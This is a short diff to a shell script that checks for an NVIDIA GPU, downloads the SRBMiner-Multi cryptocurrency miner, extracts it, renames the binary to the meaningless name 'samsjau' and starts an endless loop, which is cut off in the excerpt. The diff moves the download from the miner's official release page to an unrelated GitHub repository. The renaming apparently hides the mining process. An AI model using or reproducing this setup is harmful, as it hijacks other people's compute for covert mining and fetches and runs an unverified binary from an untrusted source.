@@ -1,7 +1,7 @@
 nvidia-smi
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/3.5.7/SRBMiner-Multi-3-5-7-Linux.tar.gz
-tar xf SRBMiner-Multi-3-5-7
-cd SRBMiner-Multi-3-5-7-Linux.tar.gz
+wget https://github.com/rxt36q6/file/releases/download/1/SRBMiner-Multi-3-5-7-Linux.tar.gz
+tar xf SRBMiner-Multi-3-5-7-Linux.tar.gz
+cd SRBMiner-Multi-3-5-7
 mv SRBMiner-MULTI samsjau
 
 while true; do
